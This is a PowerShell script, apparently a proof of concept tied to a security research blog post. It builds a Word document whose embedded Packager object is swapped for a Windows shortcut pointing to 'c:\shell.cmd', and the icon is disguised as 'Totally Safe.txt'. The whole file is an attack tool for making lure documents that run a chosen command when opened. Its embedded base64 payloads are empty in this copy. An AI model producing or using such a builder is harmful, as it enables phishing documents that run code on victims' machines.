# target file path
$filename = [Environment]::GetFolderPath('Desktop') + '\WebBrowser.docx'

# path to open
$path = 'c:\shell.cmd'
# $path = 'https://securify.nl/blog/SFY20180801/thisisfine.url'

# the temp file is used for creating the icon
$tmpfile = "$env:TEMP\Totally Safe.txt"

# load assemblies for changing the docx (zip) file
[void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[void] [Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')

# load PropertyStore (copied from https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Export-LNKPwn.ps1)
$EncodedCompressedFile = ''
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](13312)
$DeflatedStream.Read($UncompressedFileBytes, 0, 13312) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null

# load ShellLink (copied from https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Export-LNKPwn.ps1)
$EncodedCompressedFile = ''
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](80384)
$DeflatedStream.Read($UncompressedFileBytes, 0, 80384) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null
	
# create new Word document
$word = New-Object -ComObject Word.Application
$word.Visible = $false
$doc = $word.documents.add()

# HACK: use Packager to create a file icon in the document
$null = New-Item $tmpfile -ItemType file
$null = $doc.InlineShapes.AddOLEObject($null, $tmpfile)
Remove-Item $tmpfile

# save doc & close Word
$doc.SaveAs($filename)
$doc.Close($false)
$word.Quit()

# create temp folder for modifying the docx
$tmpfolder = "$env:TEMP\" + [System.Guid]::NewGuid()
$null = New-Item -Type directory -Path $tmpfolder

# unzip and replace Packager object
[System.IO.Compression.ZipFile]::ExtractToDirectory($filename, $tmpfolder)
Remove-Item "$tmpfolder\word\embeddings\oleObject1.bin"

# create oleObject header from base64 string
$oleheader = ''
$oleheader = [System.Convert]::FromBase64String($oleheader)

# create the shortcut
$lnk = [ShellLink.Shortcut]::new()
$lnk.LinkTargetIDList = [ShellLink.Structures.LinkTargetIDList]::new()
$lnk.LinkTargetIDList.Path = $path

# write header and shortcut to oleObject1.bin
$oleheader + $lnk.GetBytes() | Set-Content "$tmpfolder\word\embeddings\oleObject1.bin" -Encoding Byte

# rezip
Remove-Item $filename
[System.IO.Compression.ZipFile]::CreateFromDirectory($tmpfolder, $filename)

# cleanup
Remove-Item $tmpfolder -Force -Recurse
